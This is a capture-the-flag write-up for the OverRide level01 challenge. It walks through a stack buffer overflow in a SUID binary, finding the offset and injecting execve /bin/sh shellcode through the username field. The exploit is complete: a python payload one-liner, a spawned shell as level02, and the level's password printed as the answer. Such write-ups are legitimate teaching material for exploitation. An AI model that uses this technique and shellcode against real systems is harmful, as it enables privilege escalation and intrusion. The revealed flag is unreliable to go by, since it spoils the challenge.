# Level01 Exploit

## 1. Initial Analysis

List the files in the directory:

```bash
level01@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level02 users 7360 Sep 10  2016 level01
```

The `level01` binary has the SUID bit set, which means it will run with the permissions of the owner of the file, in this case `level02`.

## 2. Program Execution

Observe the program behavior:

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: admin
verifying username....

nope, incorrect username...

level01@OverRide:~$ 
```

The program prompts for a username. We can see that the username `admin` is incorrect.

## 3. Disassembling `main` Function

Use GDB to disassemble the `main` function:

```bash
level01@OverRide:~$ gdb level01
(gdb) disass main
```

You can convert the assembly code to C using the [CodeConvert](https://www.codeconvert.ai/assembly-to-c++-converter) tool. You can find the converted code in [source.c](source.c).

We also use Ghidra to decompile the binary. You can find the decompiled code by Ghidra in [ghidra_level01.c](Ressources/ghidra_level01.c).

## 4. Program Analysis

With the decomplied code, we can see that the program declare a buffer of 100 bytes. The username is read with `fgets` and inserted into the `a_user_name` global variable.
```c
fgets(a_user_name, 0x100, stdin);
```

With `Ghidra`, we can see that the first 7 characters of `a_user_name` are compared with `dat_wil`.

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
```

If the comparison is successful, the program will prompt for a password.

The password is read with `fgets` and inserted into a buffer declared previously. The buffer has a size of 64 bytes. But `fgets` reads `0x64` bytes, which is 100 bytes.
```c
fgets(buffer, 0x64, stdin);
```

It's a buffer overflow vulnerability.

## 5. Exploitation

### 5.1. Find the Offset

We can exploit this vulnerability by overflowing the buffer with a password bigger than 64 bytes.
We generate a pattern with [Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).
```bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

We can then use the pattern to find the offset where the return address is overwritten.
```bash
level01@OverRide:~$ gdb ./level01
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info registers eip
eip            0x37634136	0x37634136
```
The offset is 80 bytes.

### 5.2. Find the address of the `a_user_name` global variable

We can find the address of the `a_user_name` global variable with GDB.

```bash
(gdb) break main
Breakpoint 1 at 0x80484d5
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level01/level01 

Breakpoint 1, 0x080484d5 in main ()
(gdb) info address a_user_name
Symbol "a_user_name" is at 0x804a040 in a file compiled without debugging.
```
The address of the `a_user_name` global variable is `0x804a040`.

### 5.3 Execute the Exploit

We will inject shellcode into the buffer to spawn a shell. We will also overwrite the return address with the address of the `a_user_name` global variable, which contains the shellcode.
The shellcode is:
```bash
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

So for the username we insert `dat_wil` + the shellcode.
For the password we insert the padding + the address of the `a_user_name` global variable.
The address of the `a_user_name` global variable is `0x804a040`, but the shellcode begins after `dat_wil`, so we need to add 7 bytes to the address. The address to insert is `0x804a047` -> `\x47\xa0\x04\x08`.

We will use `python -c "print` to prepqre the input. `fgets` read the stdin until a newline character, so we need to add a newline character between the username and the password.

```bash
python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac' + '\x47\xa0\x04\x08'" > /tmp/test
```

We can then run the exploit:
```bash
level01@OverRide:~$ cat /tmp/test - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

Congratulations! You have successfully exploited the `level01` binary and found the password for `level02`.

```bash
level01@OverRide:~$ su level02
Password: 
```